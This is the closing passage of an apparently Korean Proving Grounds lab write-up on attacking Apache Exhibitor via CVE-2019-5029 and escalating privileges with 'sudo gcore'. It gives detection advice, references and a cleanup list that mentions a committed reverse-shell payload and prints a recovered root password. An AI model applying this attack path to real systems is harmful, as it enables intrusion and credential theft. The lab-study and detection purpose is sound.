| CUPS가 외부에 노출 | 인쇄 서버가 아니면 `cups` 중지. 필요하면 `Listen localhost:631` |
| 탐지 | 이 공격은 설정 변경 1회 + ZooKeeper 재기동으로 끝난다. Exhibitor 설정 변경에 대한 감사 로그와 알림이 없으면 사후에도 못 잡는다. `auditd`로 `/opt/exhibitor` 쓰기와 `ptrace` 시스템콜을 감시한다 |

---

## 9. 참고 자료

- **Cisco Talos TALOS-2019-0790** (CVE-2019-5029 원 공지 — 영향 범위·필드명·페이로드 형식): https://www.talosintelligence.com/vulnerability_reports/TALOS-2019-0790
- soabase/exhibitor 저장소 (**아카이브 상태**, 마지막 릴리스 `exhibitor-1.7.1` 2018-07-25): https://github.com/soabase/exhibitor
- 미해결 이슈 #389 — "Config editor of the Exhibitor Web UI versions 1.0.9 to 1.7.1." (2019-04-03 개설, **현재도 열림**): https://github.com/soabase/exhibitor/issues/389
- Apache ZooKeeper 관리자 가이드 (4자 명령 · JMX 설정): https://zookeeper.apache.org/doc/r3.4.6/zookeeperAdmin.html
- GTFOBins `gcore`: https://gtfobins.org/gtfobins/gcore/
- GTFOBins `gdb` (gcore가 없을 때의 동등 경로): https://gtfobins.org/gtfobins/gdb/
- `chown(1)` — `-R`의 기본 심볼릭 링크 처리(`-P`): https://manpages.debian.org/bookworm/coreutils/chown.1.en.html
- `sudoers(5)` — `env_reset` · `secure_path`의 의미: https://manpages.debian.org/bookworm/sudo/sudoers.5.en.html
- Oracle JMX 원격 관리 문서 (`com.sun.management.jmxremote.*` 프로퍼티): https://docs.oracle.com/javase/8/docs/technotes/guides/management/agent.html

## 남긴 흔적 (랩 정리용)

- **설정 변경**: Exhibitor의 **`java.env script` 필드에 리버스셸 페이로드를 커밋했다.** 원상복구하려면 UI에서 그 필드를 비우고 다시 Commit해야 한다. **지우지 않으면 ZooKeeper가 재기동될 때마다 리버스셸을 시도한다**
- **생성 파일**: `core.513` (코어 덤프, `sudo gcore` 실행 디렉터리에 생성). **root 패스워드가 평문으로 들어 있으므로 반드시 삭제 대상이다**
- **프로세스**: `gcore`는 PID 513을 **detach**했으므로 `password-store`는 살아 있다
- **획득 자격증명**: `root` / `ClogKingpinInning731`

## 관련 노트

- [[_WRITEUP-STANDARD]] — 이 노트의 작성 기준
- [[_STATUS]] — PG 전수 진행현황
- [[Sorcerer]] — **같은 Debian 10 / 동일 OpenSSH 배너 / 동일한 nmap OS 오탐.** 이 박스의 코어 덤프가 실제 커널을 `4.19.0-10-amd64`로 확정해 그 오탐을 반증한다. 권한상승도 같은 계열(`sudo -l`/SUID → GTFOBins)
- [[Squid]] — Windows 판 같은 사고: **`SeDebugPrivilege`/LSASS 덤프 ↔ `sudo gcore`/프로세스 메모리**. 그리고 누적 패턴 "인용이 깨지면 인코딩으로 도망간다"
- [[Hawat]] · [[Exfiltrated]] — 누적 패턴 **"인용이 깨지면 인코딩으로 도망간다"** (2-4의 base64 대안)
- [[Hub]] · [[Levram]] · [[RubyDome]] · [[Astronaut]] · [[Squid]] — 누적 패턴 **"버전 판정은 독립 근거 2개"** (1-1의 커널 오탐)
- [[Crane]] · [[RubyDome]] · [[Astronaut]] · [[Exghost]] — 누적 패턴 "응답이 성공을 뜻하지 않는다" (3-2의 Commit 성공 ≠ 셸 획득)
